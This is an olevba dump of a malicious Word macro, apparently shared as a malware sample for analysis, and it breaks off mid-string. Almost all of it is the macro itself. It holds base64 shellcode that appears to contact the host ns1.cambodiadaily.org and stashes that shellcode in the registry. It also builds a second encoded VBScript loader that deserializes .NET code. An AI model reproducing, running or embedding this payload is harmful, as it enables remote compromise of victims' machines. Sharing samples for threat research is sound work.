## Uploaded by @JohnLaTwC
## Sample hash: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812

olevba 0.50 - http://decalage.info/python/oletools
Flags        Filename                                                         
-----------  -----------------------------------------------------------------
MHT:MASIHBD- d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
===============================================================================
FILE: d2018bd4d3cb8952b23989ecbba1544338bba851016503ddcf6fa4295706c812.doc
Type: MHTML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: None - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function addData()
    Dim data As String
    data = data & "/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCL"
data = data & "QHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxL"
data = data & "i1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//V6IAAAABNb3pp"
data = data & "bGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBXaW5kb3dzIE5UIDYuMjsgV2luNjQ7IHg2"
data = data & "NDsgVHJpZGVudC82LjApAFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY"
data = data & "WFhYWFhYWFhYAFkx/1dXV1dRaDpWeaf/1et5WzHJUVFqA1FRaFAAAABTUGhXiZ/G/9XrYlkx0lJo"
data = data & "AAJghFJSUlFSUGjrVS47/9WJxjH/V1dXV1ZoLQYYe//VhcB0RDH/hfZ0BIn56wloqsXiXf/VicFo"
data = data & "RSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S8Mf/rFetJ6Jn///8vQVpPcgAAaPC1olb/1WpA"
data = data & "aAAQAABoAABAAFdoWKRT5f/Vk1NTiedXaAAgAABTVmgSloni/9WFwHTNiwcBw4XAdeVYw+g3////"
data = data & "bnMxLmNhbWJvZGlhZGFpbHkub3JnAAAA"
    
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.RegWrite "HKCU\Software\AppDataLow\DataApp\Data", data, "REG_SZ"
    
End Function
Function addApp()
    Dim app As String
    app = app & "U3ViIFNldFZlcnNpb24KRGltIHNoZWxsClNldCBzaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpCkRpbSB2ZXIK"
    app = app & "dmVyID0gInY0LjAuMzAzMTkiCk9uIEVycm9yIFJlc3VtZSBOZXh0CnNoZWxsLlJlZ1JlYWQgIkhLTE1cU09GVFdBUkVcXE1pY3Jv"
    app = app & "c29mdFwuTkVURnJhbWV3b3JrXHY0LjAuMzAzMTlcIgpJZiBFcnIuTnVtYmVyIDw+IDAgVGhlbgogIHZlciA9ICJ2Mi4wLjUwNzI3"
    app = app & "IgogIEVyci5DbGVhcgpFbmQgSWYKc2hlbGwuRW52aXJvbm1lbnQoIlByb2Nlc3MiKS5JdGVtKCJDT01QTFVTX1ZlcnNpb24iKSA9"
    app = app & "IHZlcgpFbmQgU3ViCkZ1bmN0aW9uIEJhc2U2NFRvU3RyZWFtKGIpCiAgRGltIGVuYywgbGVuZ3RoLCBiYSwgdHJhbnNmb3JtLCBt"
    app = app & "cwogIFNldCBlbmMgPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmciKQogIGxlbmd0aCA9IGVuYy5HZXRC"
    app = app & "eXRlQ291bnRfMihiKQogIFNldCB0cmFuc2Zvcm0gPSBDcmVhdGVPYmplY3QoIlN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHku"
    app = app & "RnJvbUJhc2U2NFRyYW5zZm9ybSIpCiAgU2V0IG1zID0gQ3JlYXRlT2JqZWN0KCJTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtIikKICBt"
    app = app & "cy5Xcml0ZSB0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jayhlbmMuR2V0Qnl0ZXNfNChiKSwgMCwgbGVuZ3RoKSwgMCwgKChs"
    app = app & "ZW5ndGggLyA0KSAqIDMpCiAgbXMuUG9zaXRpb24gPSAwCiAgU2V0IEJhc2U2NFRvU3RyZWFtID0gbXMKRW5kIEZ1bmN0aW9uClN1"
    app = app & "YiBSdW4KRGltIHMsIGVudHJ5X2NsYXNzCnMgPSAiQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFFQVFBQUFDSlRlWE4wWlcwdVJHVnNa"
    app = app & "V2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeSIKcyA9IHMgJiAiQXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRd0IyMWxk"
    app = app & "R2h2WkRBREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaCIKcyA9IHMgJiAiZEdsdmJraHZiR1JsY2l0RVpXeGxa"
    app = app & "MkYwWlVWdWRISjVJbE41YzNSbGJTNUVaV3hsWjJGMFpWTmxjbWxoYkdsNllYUnBiMjVJYjJ4ayIKcyA9IHMgJiAiWlhJdlUzbHpk"
    app = app & "R1Z0TGxKbFpteGxZM1JwYjI0dVRXVnRZbVZ5U1c1bWIxTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSUpBZ0FBQUFrRCIKcyA9IHMg"
